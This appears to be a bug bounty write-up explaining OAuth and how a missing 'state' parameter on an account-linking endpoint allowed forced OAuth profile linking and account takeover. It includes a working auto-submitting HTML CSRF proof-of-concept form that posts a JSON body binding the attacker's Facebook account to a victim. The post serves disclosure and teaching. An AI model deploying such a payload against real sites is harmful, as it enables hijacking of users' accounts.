
بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ

in the name of Allah, the most gracious, the most merciful.

**Hello, awesome hackers! ,**My name is Ahmed Talaat(0xtal3at), a junior penetration tester and bug bounty hunter.

This is my first write-up on a real target. I found this with my friend [0x3adwy](https://medium.com/u/4eecf46b8cb6?source=post_page-----954114158818--------------------------------), where I’ll show you how Forced OAuth profile linking leads to an account takeover.

![](https://miro.medium.com/v2/resize:fit:432/1*DDOQkN585MAvdWoBnafEYw.gif)

# What is OAuth?

OAuth is an authorization framework that allows websites and apps to request limited access to a user’s account on platforms like Google or Facebook without exposing login credentials. This lets users control the information they share and enables them to log in using their existing accounts from these providers.

# How does OAuth work?

OAuth enables secure data sharing between applications by involving three main parties:

1. Client Application: The app or website requesting access to the user’s data.(the site you use)  
2. Resource Owner: The user whose data is being accessed.  
3. OAuth Service Provider: The platform (like Google or Facebook)

The OAuth process involves the **authorization code**. Here’s how it works:

- The **Client Application** (the site you use) requests permission to access the user’s data.
- The user logs into the **OAuth Service Provider** (like Google or Facebook) and approves the request.
- The **Client Application** receives an access token that allows it to access the data.
- The **Client Application** uses this token to retrieve information from the server.

![](https://miro.medium.com/v2/resize:fit:700/1*JnPKsqH0PemPSRQ1oXFi6A.gif)

# let’s get start .

We will assume the target we are testing is called `example.com` During testing of the site, I went to **test** the OAuth authentication process. I chose Facebook and clicked “Continue” to link my Facebook account to example.com

![](https://miro.medium.com/v2/resize:fit:500/1*Yp_crpp5eeWiCTHKUhamWg.png)

Then, I captured the request that links a user’s account with an OAuth service provider (such as Google or Facebook).

I noticed that the `state` parameter is missing. This parameter acts like a CSRF token, and if it doesn't exist in this scenario, I can conduct a CSRF attack that lead to a Forced OAuth Profile link to the victim's account.

**The request was structured as follows:**

![](https://miro.medium.com/v2/resize:fit:700/1*Zn_3rTLTWnGQyOGe7bsx3Q.jpeg)

As you can see, the data is sent in JSON format, and I encountered a problem. However, I was able to bypass the CSRF protection in JSON using a trick, which I will discuss in another write-up.

Then, I generated a CSRF payload and sent it to the victim. The proof of concept (PoC) looks like this:

<html>  
  <body>  
    <form action="https://example.com/restapi/bindThirdPart" method="POST">  
      <input type="hidden" name="data" value='{  
        "accessCode": "IBUPCAUTEHNTICATE",  
        "code": "TOKEN Send From OAuth Service Provider",  
        "redirectUri": "https://www.example.com/passport/thirdpart/facebookcallback",  
        "useAccessToken": false,  
        "clientInfo": {  
          "clientId": "CLIENT_ID",  
          "pageId": "PAGE_ID",  
          "locale": "en-SA",  
          "rmsToken": "TOKEN Send From OAuth Service Provider"  
        },  
        "head": {  
          "extension": [  
            {"name": "appId", "value": "VALUE"},  
            {"name": "sequence", "value": "Value"}  
          ]  
        }  
      }' />  
      <input type="submit" value="Submit request" />  
    </form>  
    <script>  
      document.forms[0].submit(); // Automatically submit the form  
    </script>  
  </body>  
</html>

I sent the payload to the victim, and as a result, their account was linked to my Facebook account.

![](https://miro.medium.com/v2/resize:fit:700/1*Zp_HKNHb-F7zwZJ-5QUNeQ.png)

As a result, I have successfully taken over the victim’s account by logging in with my Facebook credentials, gaining access to all their information and actions.

